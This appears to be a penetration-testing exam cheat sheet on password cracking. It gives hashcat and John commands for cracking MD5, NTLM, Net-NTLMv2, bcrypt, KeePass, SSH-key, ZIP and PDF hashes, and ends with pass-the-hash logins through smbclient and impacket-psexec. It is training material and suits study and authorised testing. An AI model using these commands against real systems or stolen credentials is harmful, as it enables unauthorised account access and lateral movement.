---
description: Focused on real-world cracking during exams.
icon: lock-open
---

# Password Cracking

### Cracking MD5 / SHA1 Hashes

**Use rockyou.txt and check if the password is in the default wordlist.**

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

***

### Rule-Based Attack with Hashcat

**Mutate wordlist entries to match password policies (digits, caps, symbols).**

```bash
hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force
```

<details>

<summary>Writing <code>demo.rule</code> (for Hashcat Rule-Based Attacks)</summary>

**You want to mutate existing passwords to match common policies (e.g., capital letter, number, symbol).**

```sh
# sample demo.rule Content
c        # Capitalize first letter (e.g., password → Password)
$1       # Append 1 (e.g., Password → Password1)
$!       # Append ! (e.g., Password1 → Password1!)
^@       # Prepend @ (e.g., @Password1!)

# create it:
echo -e "c\n$1\n$!\n^@" > demo.rule

# Use it
hashcat -m 0 hash.txt wordlist.txt -r demo.rule --force

# You can chain multiple rules on one line to apply them together:
c$1$!     # Capitalize, append 1, then append !

```

</details>



***

### Brute-Force Attack

**Try all alphanumeric combinations of a given length.**

```bash
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a --force
```

***

### Crack KeePass `.kdbx` Database

**Extract hash using keepass2john and crack with hashcat.**

```bash
keepass2john db.kdbx > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt --force
```

***

### Crack SSH Private Key Passphrase

**Convert with ssh2john and crack with John or Hashcat (if supported).**

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

***

### Crack NTLM Hashes

**Mode `-m 1000` for NTLM hashes.**

```bash
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

***

### Crack Net-NTLMv2 Hashes

**Captured via responder or relays; use mode `-m 5600`.**

```bash
hashcat -m 5600 ntlmv2.hash wordlist.txt --force
```

***

### Crack bcrypt (mode 3200)

**Used in some CMS platforms or modern Linux user hashes.**

```bash
hashcat -m 3200 bcrypt.hash rockyou.txt --force
```

***

### Crack ZIP File Passwords

**Convert ZIP to hash using zip2john and crack it.**

```bash
zip2john secret.zip > zip.hash
hashcat -m 13600 zip.hash rockyou.txt --force
```

***

### Crack PDF File Passwords

**Convert PDF to hash using pdf2john and crack with hashcat.**

```bash
pdf2john.py secret.pdf > pdf.hash
hashcat -m 10500 pdf.hash rockyou.txt --force
```

***

### Pass-the-Hash (NTLM SMB / WinRM)

**Use valid hash to authenticate without cracking.**

```bash
smbclient \\target\share -U Administrator --pw-nt-hash <NTLM_HASH>
```

```bash
impacket-psexec -hashes :<NTLM_HASH> Administrator@target-ip
```
